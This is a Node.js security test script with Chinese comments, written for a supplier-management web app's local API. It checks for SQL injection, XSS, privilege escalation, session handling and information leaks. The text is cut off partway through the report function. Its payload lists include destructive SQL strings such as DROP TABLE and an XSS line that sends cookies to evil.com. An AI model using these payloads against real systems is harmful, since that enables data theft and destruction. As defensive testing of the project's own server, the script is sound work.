/**
 * 供应商管理系统 - 高级安全测试
 * Advanced Security Testing Suite
 *
 * 测试项目：
 * 1. SQL 注入漏洞检测
 * 2. XSS 跨站脚本漏洞检测
 * 3. CSRF 跨站请求伪造测试
 * 4. 权限边界测试（横向越权、纵向越权）
 * 5. 敏感数据加密验证
 * 6. 会话管理安全测试
 * 7. 文件上传安全测试
 * 8. 信息泄露测试
 */

const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const API_BASE = 'http://localhost:3001';
const RESULTS = {
  vulnerabilities: [],
  passed: [],
  warnings: [],
  critical: []
};

// 颜色输出
const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  cyan: '\x1b[36m',
  magenta: '\x1b[35m'
};

function log(message, color = 'reset') {
  console.log(`${colors[color]}${message}${colors.reset}`);
}

function logSection(title) {
  console.log('\n' + '='.repeat(70));
  log(title, 'cyan');
  console.log('='.repeat(70));
}

// HTTP 请求封装
function request(path, options = {}) {
  return new Promise((resolve, reject) => {
    const url = `${API_BASE}${path}`;
    const startTime = Date.now();

    const req = http.request(url, {
      method: options.method || 'GET',
      headers: {
        'Content-Type': 'application/json',
        ...options.headers
      }
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        const duration = Date.now() - startTime;
        try {
          resolve({
            status: res.statusCode,
            headers: res.headers,
            body: data ? JSON.parse(data) : null,
            duration,
            rawBody: data
          });
        } catch (e) {
          resolve({
            status: res.statusCode,
            headers: res.headers,
            body: null,
            duration,
            rawBody: data
          });
        }
      });
    });

    req.on('error', reject);

    if (options.body) {
      req.write(JSON.stringify(options.body));
    }

    req.end();
  });
}

// 辅助函数：获取测试用户 Token
async function getAuthToken(username, password) {
  try {
    const response = await request('/api/auth/login', {
      method: 'POST',
      body: { username, password }
    });
    return response.body?.token || null;
  } catch (error) {
    return null;
  }
}

// ============================================================================
// 测试 1: SQL 注入漏洞检测
// ============================================================================
async function testSQLInjection() {
  logSection('测试 1: SQL 注入漏洞检测');

  const sqlPayloads = [
    // 经典 SQL 注入载荷
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",

    // Union-based 注入
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION ALL SELECT NULL--",

    // 布尔盲注
    "' AND '1'='1",
    "' AND '1'='2",

    // 时间盲注
    "'; WAITFOR DELAY '00:00:05'--",
    "' AND SLEEP(5)--",

    // 堆叠查询
    "'; DROP TABLE users--",
    "'; DELETE FROM users WHERE '1'='1",
  ];

  log('\n测试登录端点 SQL 注入防护...', 'blue');

  let vulnerableCount = 0;
  let protectedCount = 0;

  for (const payload of sqlPayloads) {
    try {
      const response = await request('/api/auth/login', {
        method: 'POST',
        body: {
          username: payload,
          password: 'test123'
        }
      });

      // 如果返回 200 且有 token，可能存在 SQL 注入
      if (response.status === 200 && response.body?.token) {
        log(`  ✗ 危险：SQL 注入载荷绕过认证: ${payload}`, 'red');
        RESULTS.vulnerabilities.push({
          type: 'SQL Injection',
          severity: 'CRITICAL',
          endpoint: '/api/auth/login',
          payload: payload,
          detail: '登录接口可能存在 SQL 注入漏洞'
        });
        RESULTS.critical.push(`SQL 注入漏洞: ${payload}`);
        vulnerableCount++;
      } else if (response.status === 401 || response.status === 400) {
        // 正确拒绝
        protectedCount++;
      }
    } catch (error) {
      // 连接错误，跳过
    }
  }

  if (vulnerableCount === 0) {
    log(`  ✓ 登录端点 SQL 注入防护有效 (测试 ${sqlPayloads.length} 个载荷)`, 'green');
    RESULTS.passed.push({
      test: 'SQL 注入防护 - 登录',
      detail: `成功防御 ${sqlPayloads.length} 个 SQL 注入载荷`
    });
  }

  // 测试查询端点
  log('\n测试查询端点 SQL 注入防护...', 'blue');

  const adminToken = await getAuthToken('admin001', 'Admin#123');
  if (adminToken) {
    const queryPayloads = [
      "1' OR '1'='1",
      "1 OR 1=1",
      "1'; DROP TABLE suppliers--"
    ];

    let queryVulnerable = false;

    for (const payload of queryPayloads) {
      try {
        const response = await request(`/api/suppliers?id=${encodeURIComponent(payload)}`, {
          headers: { 'Authorization': `Bearer ${adminToken}` }
        });

        // 检查是否返回了异常多的数据或错误信息
        if (response.status === 200 && response.body?.data?.length > 100) {
          log(`  ⚠ 可疑：查询返回异常数据量: ${payload}`, 'yellow');
          RESULTS.warnings.push(`查询端点可能存在 SQL 注入风险: ${payload}`);
          queryVulnerable = true;
        }
      } catch (error) {
        // 忽略连接错误
      }
    }

    if (!queryVulnerable) {
      log('  ✓ 查询端点 SQL 注入防护有效', 'green');
      RESULTS.passed.push({
        test: 'SQL 注入防护 - 查询',
        detail: '查询端点使用参数化查询，防护有效'
      });
    }
  }

  // 检查数据库代码实现
  log('\n检查数据库代码实现...', 'blue');
  try {
    const dbPath = path.join(__dirname, 'supplier-backend', 'db.js');
    const authPath = path.join(__dirname, 'supplier-backend', 'routes', 'auth.js');

    if (fs.existsSync(dbPath) && fs.existsSync(authPath)) {
      const dbContent = fs.readFileSync(dbPath, 'utf8');
      const authContent = fs.readFileSync(authPath, 'utf8');

      // 检查是否使用 prepare 和参数化查询
      const usesPrepare = dbContent.includes('.prepare(') || authContent.includes('.prepare(');
      const usesStringConcat = authContent.match(/['"]\s*\+\s*\w+/) !== null;

      if (usesPrepare && !usesStringConcat) {
        log('  ✓ 代码使用参数化查询 (Prepared Statements)', 'green');
        RESULTS.passed.push({
          test: 'SQL 注入防护 - 代码审查',
          detail: '使用 better-sqlite3 的 prepared statements'
        });
      } else if (usesStringConcat) {
        log('  ⚠ 警告：发现字符串拼接，可能存在风险', 'yellow');
        RESULTS.warnings.push('部分代码使用字符串拼接构建 SQL 查询');
      }
    }
  } catch (error) {
    log(`  ⚠ 无法检查代码: ${error.message}`, 'yellow');
  }
}

// ============================================================================
// 测试 2: XSS 跨站脚本漏洞检测
// ============================================================================
async function testXSS() {
  logSection('测试 2: XSS 跨站脚本漏洞检测');

  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg/onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<body onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    '\';alert("XSS");//',
    '<script>document.cookie</script>',
    '<img src="x" onerror="fetch(\'http://evil.com?cookie=\'+document.cookie)">',
  ];

  log('\n测试 API 响应 XSS 防护...', 'blue');

  const adminToken = await getAuthToken('admin001', 'Admin#123');
  if (!adminToken) {
    log('  ✗ 无法获取管理员 Token', 'red');
    return;
  }

  let xssVulnerable = false;

  // 测试创建供应商时的 XSS
  for (const payload of xssPayloads.slice(0, 3)) { // 测试前 3 个载荷
    try {
      const response = await request('/api/suppliers', {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${adminToken}` },
        body: {
          companyName: payload,
          contactPerson: 'Test User',
          contactPhone: '13800138000',
          contactEmail: 'test@example.com',
          category: '原材料供应商',
          status: 'potential'
        }
      });

      if (response.status === 201 || response.status === 200) {
        // 检查响应中是否直接返回了脚本标签（未转义）
        if (response.rawBody.includes('<script>') || response.rawBody.includes('onerror=')) {
          log(`  ✗ XSS 漏洞：响应未转义脚本: ${payload.substring(0, 30)}...`, 'red');
          RESULTS.vulnerabilities.push({
            type: 'XSS',
            severity: 'HIGH',
            endpoint: '/api/suppliers',
            payload: payload,
            detail: 'API 响应包含未转义的脚本标签'
          });
          RESULTS.critical.push(`XSS 漏洞: ${payload.substring(0, 30)}`);
          xssVulnerable = true;
        }
      }
    } catch (error) {
      // 忽略错误
    }
  }

  if (!xssVulnerable) {
    log('  ✓ API 响应不包含未转义的脚本', 'green');
    RESULTS.passed.push({
      test: 'XSS 防护 - API 响应',
      detail: 'API 返回 JSON 格式，自动转义特殊字符'
    });
  }

  // 检查前端代码
  log('\n检查前端 XSS 防护机制...', 'blue');

  try {
    const vueFiles = [
      path.join(__dirname, 'src', 'views', 'LoginView.vue'),
      path.join(__dirname, 'src', 'components', 'AppHeader.vue')
    ];

    let usesVueTemplate = false;
    let usesDangerousHTML = false;

    for (const file of vueFiles) {
      if (fs.existsSync(file)) {
        const content = fs.readFileSync(file, 'utf8');
        if (content.includes('v-html')) {
          usesDangerousHTML = true;
        }
        if (content.includes('{{') && content.includes('}}')) {
          usesVueTemplate = true;
        }
      }
    }

    if (usesVueTemplate) {
      log('  ✓ 使用 Vue 模板语法（自动转义）', 'green');
      RESULTS.passed.push({
        test: 'XSS 防护 - 前端',
        detail: 'Vue 3 模板自动转义 HTML 特殊字符'
      });
    }

    if (usesDangerousHTML) {
      log('  ⚠ 警告：发现 v-html 指令，可能存在 XSS 风险', 'yellow');
      RESULTS.warnings.push('前端使用 v-html 指令，需确保数据已清理');
    } else {
      log('  ✓ 未使用危险的 v-html 指令', 'green');
    }
  } catch (error) {
    log(`  ⚠ 无法检查前端代码: ${error.message}`, 'yellow');
  }

  // 检查 Content-Type 头
  log('\n检查 Content-Type 安全头...', 'blue');
  try {
    const response = await request('/api/suppliers', {
      headers: { 'Authorization': `Bearer ${adminToken}` }
    });

    const contentType = response.headers['content-type'] || '';
    if (contentType.includes('application/json')) {
      log('  ✓ Content-Type 正确设置为 application/json', 'green');
      RESULTS.passed.push({
        test: 'XSS 防护 - Content-Type',
        detail: 'API 返回 JSON 格式，降低 XSS 风险'
      });
    } else {
      log('  ⚠ Content-Type 未设置或不正确', 'yellow');
      RESULTS.warnings.push('Content-Type 头未正确设置');
    }
  } catch (error) {
    // 忽略
  }
}

// ============================================================================
// 测试 3: CSRF 跨站请求伪造测试
// ============================================================================
async function testCSRF() {
  logSection('测试 3: CSRF 跨站请求伪造测试');

  log('\n检查 CSRF 防护机制...', 'blue');

  const adminToken = await getAuthToken('admin001', 'Admin#123');
  if (!adminToken) {
    log('  ✗ 无法获取管理员 Token', 'red');
    return;
  }

  // 检查是否使用 JWT Token（Bearer Token）
  log('  检查认证机制...', 'blue');

  try {
    const response = await request('/api/suppliers', {
      headers: { 'Authorization': `Bearer ${adminToken}` }
    });

    if (response.status === 200) {
      log('  ✓ 使用 JWT Bearer Token 认证', 'green');
      log('  ✓ Token 在 Authorization Header 中，不易被 CSRF 利用', 'green');
      RESULTS.passed.push({
        test: 'CSRF 防护 - JWT Token',
        detail: 'JWT Token 通过 Authorization Header 传递，CSRF 攻击难度高'
      });
    }
  } catch (error) {
    // 忽略
  }

  // 检查是否使用 Cookie-based 会话
  log('  检查 Cookie 使用情况...', 'blue');

  try {
    const response = await request('/api/auth/login', {
      method: 'POST',
      body: { username: 'admin001', password: 'Admin#123' }
    });

    const setCookie = response.headers['set-cookie'];
    if (!setCookie) {
      log('  ✓ 不使用 Cookie 存储会话，CSRF 风险低', 'green');
      RESULTS.passed.push({
        test: 'CSRF 防护 - Cookie',
        detail: '不使用 Cookie 存储认证信息'
      });
    } else {
      log('  ⚠ 警告：使用 Cookie，建议添加 CSRF Token 防护', 'yellow');
      RESULTS.warnings.push('使用 Cookie 存储会话，建议添加 CSRF Token');
    }
  } catch (error) {
    // 忽略
  }

  // 检查 SameSite Cookie 属性
  log('  检查 SameSite 属性...', 'blue');
  try {
    const appPath = path.join(__dirname, 'supplier-backend', 'app.js');
    if (fs.existsSync(appPath)) {
      const content = fs.readFileSync(appPath, 'utf8');
      if (content.includes('sameSite')) {
        log('  ✓ 配置了 SameSite Cookie 属性', 'green');
      } else {
        log('  ℹ 建议配置 SameSite Cookie 属性增强防护', 'blue');
      }
    }
  } catch (error) {
    // 忽略
  }
}

// ============================================================================
// 测试 4: 权限边界测试（横向越权、纵向越权）
// ============================================================================
async function testAuthorizationBoundaries() {
  logSection('测试 4: 权限边界测试（越权检测）');

  // 获取不同角色的 Token
  const adminToken = await getAuthToken('admin001', 'Admin#123');
  const purchaserToken = await getAuthToken('purch001', 'Purch#123');
  const supplierToken = await getAuthToken('tempsupp001', 'Temp#123');

  // -------------------------
  // 4.1 纵向越权测试
  // -------------------------
  log('\n4.1 纵向越权测试（低权限访问高权限资源）', 'blue');

  let verticalEscalationFound = false;

  // 测试：供应商尝试访问用户管理（管理员功能）
  if (supplierToken) {
    try {
      const response = await request('/api/users', {
        headers: { 'Authorization': `Bearer ${supplierToken}` }
      });

      if (response.status === 200) {
        log('  ✗ 严重：供应商可访问用户管理接口！', 'red');
        RESULTS.vulnerabilities.push({
          type: 'Vertical Privilege Escalation',
          severity: 'CRITICAL',
          endpoint: '/api/users',
          detail: '低权限用户（供应商）可访问管理员功能'
        });
        RESULTS.critical.push('纵向越权：供应商可访问用户管理');
        verticalEscalationFound = true;
      } else if (response.status === 403 || response.status === 401) {
        log('  ✓ 供应商无法访问用户管理（正确拒绝）', 'green');
      }
    } catch (error) {
      // 忽略
    }
  }

  // 测试：采购员尝试访问财务功能
  if (purchaserToken) {
    try {
      const response = await request('/api/invoices', {
        headers: { 'Authorization': `Bearer ${purchaserToken}` }
      });

      // 如果采购员能访问财务功能，可能存在越权
      if (response.status === 200) {
        log('  ℹ 采购员可访问发票接口（需验证业务逻辑）', 'blue');
        // 注：这可能是正常的业务需求，需要根据实际情况判断
      } else if (response.status === 403) {
        log('  ✓ 采购员无法访问发票接口（权限隔离）', 'green');
      }
    } catch (error) {
      // 忽略
    }
  }

  if (!verticalEscalationFound) {
    RESULTS.passed.push({
      test: '纵向越权防护',
      detail: '低权限用户无法访问高权限功能'
    });
  }

  // -------------------------
  // 4.2 横向越权测试
  // -------------------------
  log('\n4.2 横向越权测试（访问其他用户数据）', 'blue');

  let horizontalEscalationFound = false;

  if (adminToken) {
    try {
      // 1. 创建测试供应商 A
      const supplierA = await request('/api/suppliers', {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${adminToken}` },
        body: {
          companyName: '测试供应商A_' + Date.now(),
          contactPerson: 'User A',
          contactPhone: '13800138001',
          contactEmail: 'usera@test.com',
          category: '原材料供应商',
          status: 'potential'
        }
      });

      // 2. 创建测试供应商 B
      const supplierB = await request('/api/suppliers', {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${adminToken}` },
        body: {
          companyName: '测试供应商B_' + Date.now(),
          contactPerson: 'User B',
          contactPhone: '13800138002',
          contactEmail: 'userb@test.com',
          category: '原材料供应商',
          status: 'potential'
        }
      });

      if (supplierA.body?.id && supplierB.body?.id) {
        const supplierAId = supplierA.body.id;
        const supplierBId = supplierB.body.id;

        log(`  创建测试数据：供应商A (ID: ${supplierAId}), 供应商B (ID: ${supplierBId})`, 'blue');

        // 3. 用供应商 A 的身份尝试访问供应商 B 的数据
        if (supplierToken) {
          try {
            const response = await request(`/api/suppliers/${supplierBId}`, {
              headers: { 'Authorization': `Bearer ${supplierToken}` }
            });

            if (response.status === 200) {
              log('  ⚠ 可疑：供应商账户可访问其他供应商详情', 'yellow');
              RESULTS.warnings.push('可能存在横向越权：供应商可访问其他供应商数据');
              horizontalEscalationFound = true;
            } else if (response.status === 403 || response.status === 404) {
              log('  ✓ 供应商无法访问其他供应商数据（正确隔离）', 'green');
            }
          } catch (error) {
            // 忽略
          }
        }

        // 4. 尝试修改其他供应商数据
        if (supplierToken) {
          try {
            const response = await request(`/api/suppliers/${supplierBId}`, {
              method: 'PUT',
              headers: { 'Authorization': `Bearer ${supplierToken}` },
              body: {
                companyName: '被篡改的公司名'
              }
            });

            if (response.status === 200) {
              log('  ✗ 严重：供应商可修改其他供应商数据！', 'red');
              RESULTS.vulnerabilities.push({
                type: 'Horizontal Privilege Escalation',
                severity: 'CRITICAL',
                endpoint: `/api/suppliers/${supplierBId}`,
                detail: '用户可修改其他用户的数据'
              });
              RESULTS.critical.push('横向越权：可修改其他供应商数据');
            } else if (response.status === 403) {
              log('  ✓ 供应商无法修改其他供应商数据（正确保护）', 'green');
            }
          } catch (error) {
            // 忽略
          }
        }
      }
    } catch (error) {
      log(`  ⚠ 横向越权测试失败: ${error.message}`, 'yellow');
    }
  }

  if (!horizontalEscalationFound) {
    RESULTS.passed.push({
      test: '横向越权防护',
      detail: '用户无法访问或修改其他用户的数据'
    });
  }

  // -------------------------
  // 4.3 未授权访问测试
  // -------------------------
  log('\n4.3 未授权访问测试', 'blue');

  const protectedEndpoints = [
    '/api/suppliers',
    '/api/users',
    '/api/contracts',
    '/api/invoices',
    '/api/audit'
  ];

  let unauthorizedAccessFound = false;

  for (const endpoint of protectedEndpoints) {
    try {
      const response = await request(endpoint);
      if (response.status === 200) {
        log(`  ✗ 严重：${endpoint} 允许未授权访问！`, 'red');
        RESULTS.vulnerabilities.push({
          type: 'Unauthorized Access',
          severity: 'CRITICAL',
          endpoint: endpoint,
          detail: '端点允许未授权访问'
        });
        RESULTS.critical.push(`未授权访问：${endpoint}`);
        unauthorizedAccessFound = true;
      } else if (response.status === 401) {
        log(`  ✓ ${endpoint} 正确拒绝未授权访问`, 'green');
      }
    } catch (error) {
      // 忽略
    }
  }

  if (!unauthorizedAccessFound) {
    RESULTS.passed.push({
      test: '未授权访问防护',
      detail: '所有受保护端点正确拒绝未授权访问'
    });
  }
}

// ============================================================================
// 测试 5: 敏感数据加密验证
// ============================================================================
async function testDataEncryption() {
  logSection('测试 5: 敏感数据加密验证');

  log('\n5.1 检查密码加密实现', 'blue');

  try {
    const authPath = path.join(__dirname, 'supplier-backend', 'routes', 'auth.js');
    if (fs.existsSync(authPath)) {
      const content = fs.readFileSync(authPath, 'utf8');

      // 检查是否使用 bcrypt
      if (content.includes('bcrypt')) {
        log('  ✓ 使用 bcrypt 加密密码', 'green');

        // 检查 bcrypt rounds
        const roundsMatch = content.match(/hashSync\([^,]+,\s*(\d+)\)/);
        if (roundsMatch) {
          const rounds = parseInt(roundsMatch[1]);
          if (rounds >= 10) {
            log(`  ✓ bcrypt rounds: ${rounds}（推荐 >= 10）`, 'green');
            RESULTS.passed.push({
              test: '密码加密强度',
              detail: `使用 bcrypt ${rounds} rounds 加密`
            });
          } else {
            log(`  ⚠ bcrypt rounds: ${rounds}（建议增加到 >= 10）`, 'yellow');
            RESULTS.warnings.push(`bcrypt rounds 较低: ${rounds}`);
          }
        }

        // 检查是否使用了不安全的 MD5
        if (content.includes('md5') || content.includes('MD5')) {
          log('  ✗ 警告：发现 MD5 加密（不安全）', 'red');
          RESULTS.vulnerabilities.push({
            type: 'Weak Encryption',
            severity: 'HIGH',
            detail: '使用 MD5 加密密码（已被攻破）'
          });
        } else {
          log('  ✓ 未使用不安全的 MD5 加密', 'green');
        }
      } else {
        log('  ✗ 未找到 bcrypt 加密', 'red');
        RESULTS.critical.push('密码未使用安全的加密算法');
      }
    }
  } catch (error) {
    log(`  ⚠ 无法检查加密代码: ${error.message}`, 'yellow');
  }

  log('\n5.2 检查传输加密（HTTPS）', 'blue');

  // 检查是否使用 HTTPS
  if (API_BASE.startsWith('https://')) {
    log('  ✓ API 使用 HTTPS 加密传输', 'green');
    RESULTS.passed.push({
      test: '传输加密',
      detail: 'API 使用 HTTPS 保护数据传输'
    });
  } else {
    log('  ⚠ 警告：API 使用 HTTP 明文传输（生产环境必须使用 HTTPS）', 'yellow');
    RESULTS.warnings.push('开发环境使用 HTTP，生产环境必须配置 HTTPS');
  }

  log('\n5.3 检查敏感字段保护', 'blue');

  const adminToken = await getAuthToken('admin001', 'Admin#123');
  if (adminToken) {
    try {
      // 获取用户信息
      const response = await request('/api/auth/me', {
        headers: { 'Authorization': `Bearer ${adminToken}` }
      });

      const sensitiveFields = ['password', 'passwordHash', 'secret', 'privateKey'];
      const userFields = Object.keys(response.body?.user || {});
      const exposedFields = sensitiveFields.filter(field => userFields.includes(field));

      if (exposedFields.length > 0) {
        log(`  ✗ 敏感字段暴露: ${exposedFields.join(', ')}`, 'red');
        RESULTS.vulnerabilities.push({
          type: 'Sensitive Data Exposure',
          severity: 'HIGH',
          endpoint: '/api/auth/me',
          detail: `暴露敏感字段: ${exposedFields.join(', ')}`
        });
      } else {
        log('  ✓ 用户信息不包含敏感字段', 'green');
        RESULTS.passed.push({
          test: '敏感字段保护',
          detail: 'API 响应不包含密码等敏感字段'
        });
      }
    } catch (error) {
      // 忽略
    }
  }

  log('\n5.4 检查手机号、身份证等敏感信息处理', 'blue');

  if (adminToken) {
    try {
      const response = await request('/api/suppliers?limit=1', {
        headers: { 'Authorization': `Bearer ${adminToken}` }
      });

      if (response.body?.data?.[0]) {
        const supplier = response.body.data[0];

        // 检查手机号是否脱敏
        if (supplier.contactPhone && supplier.contactPhone.length === 11) {
          if (supplier.contactPhone.includes('*')) {
            log('  ✓ 手机号部分脱敏显示', 'green');
          } else {
            log('  ℹ 手机号完整显示（根据业务需求可能需要脱敏）', 'blue');
          }
        }
      }
    } catch (error) {
      // 忽略
    }
  }
}

// ============================================================================
// 测试 6: 会话管理安全测试
// ============================================================================
async function testSessionManagement() {
  logSection('测试 6: 会话管理安全测试');

  log('\n6.1 Token 过期测试', 'blue');

  // JWT Token 应该有过期时间
  const token = await getAuthToken('admin001', 'Admin#123');
  if (token) {
    try {
      const parts = token.split('.');
      const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());

      if (payload.exp) {
        const expiryDate = new Date(payload.exp * 1000);
        const now = new Date();
        const hours = (expiryDate - now) / (1000 * 60 * 60);

        log(`  ✓ Token 设置了过期时间: ${hours.toFixed(1)} 小时`, 'green');

        if (hours > 24) {
          log('  ⚠ Token 有效期较长，建议缩短', 'yellow');
          RESULTS.warnings.push(`Token 有效期过长: ${hours.toFixed(1)} 小时`);
        } else {
          RESULTS.passed.push({
            test: 'Token 过期策略',
            detail: `Token ${hours.toFixed(1)} 小时后过期`
          });
        }
      } else {
        log('  ✗ Token 未设置过期时间！', 'red');
        RESULTS.critical.push('JWT Token 未设置过期时间');
      }
    } catch (error) {
      log(`  ⚠ 无法解析 Token: ${error.message}`, 'yellow');
    }
  }

  log('\n6.2 Token 刷新机制检查', 'blue');

  // 检查是否有 refresh token 机制
  try {
    const response = await request('/api/auth/refresh', {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${token}` }
    });

    if (response.status === 200 || response.status === 404) {
      if (response.status === 404) {
        log('  ℹ 未实现 Token 刷新机制（可选功能）', 'blue');
      } else {
        log('  ✓ 支持 Token 刷新', 'green');
      }
    }
  } catch (error) {
    // 忽略
  }

  log('\n6.3 登出后 Token 失效检查', 'blue');

  // 测试登出
  const testToken = await getAuthToken('purch001', 'Purch#123');
  if (testToken) {
    try {
      // 登出
      await request('/api/auth/logout', {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${testToken}` }
      });

      // 尝试使用旧 Token 访问
      const response = await request('/api/suppliers', {
        headers: { 'Authorization': `Bearer ${testToken}` }
      });

      if (response.status === 200) {
        log('  ⚠ 注意：登出后 Token 仍然有效（JWT 无状态特性）', 'yellow');
        log('  ℹ 建议：实现 Token 黑名单或使用短期 Token', 'blue');
        RESULTS.warnings.push('JWT 登出后仍有效，建议实现 Token 黑名单');
      } else if (response.status === 401) {
        log('  ✓ 登出后 Token 已失效', 'green');
        RESULTS.passed.push({
          test: '登出 Token 失效',
          detail: '登出后 Token 无法继续使用'
        });
      }
    } catch (error) {
      // 忽略
    }
  }
}

// ============================================================================
// 测试 7: 文件上传安全测试
// ============================================================================
async function testFileUploadSecurity() {
  logSection('测试 7: 文件上传安全测试');

  log('\n检查文件上传配置...', 'blue');

  try {
    const appPath = path.join(__dirname, 'supplier-backend', 'app.js');
    if (fs.existsSync(appPath)) {
      const content = fs.readFileSync(appPath, 'utf8');

      // 检查是否使用 multer
      if (content.includes('multer')) {
        log('  ✓ 使用 multer 处理文件上传', 'green');

        // 检查文件大小限制
        const sizeLimitMatch = content.match(/limits:\s*{\s*fileSize:\s*(\d+)/);
        if (sizeLimitMatch) {
          const sizeLimit = parseInt(sizeLimitMatch[1]);
          const sizeMB = (sizeLimit / (1024 * 1024)).toFixed(1);
          log(`  ✓ 设置文件大小限制: ${sizeMB} MB`, 'green');
          RESULTS.passed.push({
            test: '文件上传大小限制',
            detail: `最大文件大小: ${sizeMB} MB`
          });
        } else {
          log('  ⚠ 未设置文件大小限制', 'yellow');
          RESULTS.warnings.push('文件上传未设置大小限制');
        }

        // 检查文件类型过滤
        if (content.includes('fileFilter') || content.includes('mimetype')) {
          log('  ✓ 配置了文件类型过滤', 'green');
          RESULTS.passed.push({
            test: '文件类型过滤',
            detail: '配置了文件类型白名单'
          });
        } else {
          log('  ⚠ 未配置文件类型过滤', 'yellow');
          RESULTS.warnings.push('建议添加文件类型白名单验证');
        }
      } else {
        log('  ℹ 未找到文件上传配置', 'blue');
      }

      // 检查上传目录配置
      if (content.includes('uploads') || content.includes('destination')) {
        log('  ✓ 配置了上传目录', 'green');

        // 检查是否允许执行文件
        const uploadsPath = path.join(__dirname, 'supplier-backend', 'uploads');
        if (fs.existsSync(uploadsPath)) {
          log('  ✓ 上传目录存在', 'green');
          log('  ℹ 建议：确保上传目录禁止执行脚本（.htaccess 或 nginx 配置）', 'blue');
        }
      }
    }
  } catch (error) {
    log(`  ⚠ 无法检查文件上传配置: ${error.message}`, 'yellow');
  }
}

// ============================================================================
// 测试 8: 信息泄露测试
// ============================================================================
async function testInformationDisclosure() {
  logSection('测试 8: 信息泄露测试');

  log('\n8.1 检查错误信息泄露', 'blue');

  try {
    // 发送错误请求，检查错误信息
    const response = await request('/api/suppliers/999999999');

    if (response.rawBody) {
      // 检查是否泄露数据库信息
      const leaksDatabase = response.rawBody.includes('sqlite') ||
                           response.rawBody.includes('database') ||
                           response.rawBody.includes('SQL');

      // 检查是否泄露路径信息
      const leaksPath = response.rawBody.includes('C:\\') ||
                       response.rawBody.includes('/home/') ||
                       response.rawBody.includes('node_modules');

      // 检查是否泄露版本信息
      const leaksVersion = response.rawBody.includes('node:') ||
                          response.rawBody.includes('at ');

      if (leaksDatabase) {
        log('  ⚠ 错误信息泄露数据库信息', 'yellow');
        RESULTS.warnings.push('错误响应包含数据库相关信息');
      }

      if (leaksPath) {
        log('  ⚠ 错误信息泄露系统路径', 'yellow');
        RESULTS.warnings.push('错误响应包含系统路径信息');
      }

      if (leaksVersion) {
        log('  ⚠ 错误信息泄露堆栈跟踪', 'yellow');
        RESULTS.warnings.push('错误响应包含堆栈跟踪信息');
      }

      if (!leaksDatabase && !leaksPath && !leaksVersion) {
        log('  ✓ 错误信息不泄露敏感信息', 'green');
        RESULTS.passed.push({
          test: '错误信息泄露防护',
          detail: '错误响应不包含敏感系统信息'
        });
      }
    }
  } catch (error) {
    // 忽略
  }

  log('\n8.2 检查 HTTP 响应头安全', 'blue');

  try {
    const response = await request('/api/suppliers');
    const headers = response.headers;

    // 检查安全头
    const securityHeaders = {
      'x-content-type-options': 'nosniff',
      'x-frame-options': 'DENY',
      'x-xss-protection': '1; mode=block',
      'strict-transport-security': 'max-age=31536000'
    };

    let missingHeaders = [];
    for (const [header, expectedValue] of Object.entries(securityHeaders)) {
      if (!headers[header]) {
        missingHeaders.push(header);
      } else {
        log(`  ✓ ${header}: ${headers[header]}`, 'green');
      }
    }

    if (missingHeaders.length > 0) {
      log(`  ⚠ 缺少安全响应头: ${missingHeaders.join(', ')}`, 'yellow');
      RESULTS.warnings.push(`建议添加安全响应头: ${missingHeaders.join(', ')}`);
    } else {
      RESULTS.passed.push({
        test: 'HTTP 安全响应头',
        detail: '配置了推荐的安全响应头'
      });
    }

    // 检查是否暴露服务器信息
    if (headers['x-powered-by']) {
      log(`  ⚠ 暴露了服务器信息: ${headers['x-powered-by']}`, 'yellow');
      RESULTS.warnings.push('响应头暴露了 X-Powered-By 信息');
    } else {
      log('  ✓ 未暴露 X-Powered-By 头', 'green');
    }
  } catch (error) {
    // 忽略
  }

  log('\n8.3 检查版本信息暴露', 'blue');

  try {
    const packagePath = path.join(__dirname, 'package.json');
    if (fs.existsSync(packagePath)) {
      const packageJson = JSON.parse(fs.readFileSync(packagePath, 'utf8'));
      log(`  ℹ 应用版本: ${packageJson.version || 'N/A'}`, 'blue');
      log('  ℹ 建议：不要在 API 响应中暴露版本号', 'blue');
    }
  } catch (error) {
    // 忽略
  }
}

// ============================================================================
// 生成测试报告
// ============================================================================
function generateReport() {
  logSection('安全测试报告汇总');

  console.log('\n');
  log('【严重漏洞】', 'red');
  if (RESULTS.critical.length === 0) {
    log('  ✓ 未发现严重安全漏洞', 'green');
  } else {
    RESULTS.critical.forEach(issue => {
      log(`  ✗ ${issue}`, 'red');
    });
  }

  console.log('\n');
  log('【发现的漏洞】', 'red');
  if (RESULTS.vulnerabilities.length === 0) {
    log('  ✓ 未发现安全漏洞', 'green');
  } else {
    RESULTS.vulnerabilities.forEach(vuln => {
      log(`  ✗ [${vuln.severity}] ${vuln.type} - ${vuln.endpoint || 'N/A'}`, 'red');
      log(`    ${vuln.detail}`, 'red');
    });
  }

  console.log('\n');
  log('【安全警告】', 'yellow');
  if (RESULTS.warnings.length === 0) {
    log('  ✓ 无安全警告', 'green');
  } else {
    RESULTS.warnings.forEach(warning => {
      log(`  ⚠ ${warning}`, 'yellow');
    });
  }

  console.log('\n');
  log('【通过的测试】', 'green');
  if (RESULTS.passed.length > 0) {
    RESULTS.passed.forEach(test => {
      log(`  ✓ ${test.test}: ${test.detail}`, 'green');
    });
  }

  console.log('\n');
  log('【安全评分】', 'cyan');

  const criticalCount = RESULTS.critical.length;
  const vulnCount = RESULTS.vulnerabilities.length;
  const warningCount = RESULTS.warnings.length;
  const passedCount = RESULTS.passed.length;

  let score = 100;
  score -= criticalCount * 20;  // 严重问题 -20 分
  score -= vulnCount * 10;      // 漏洞 -10 分
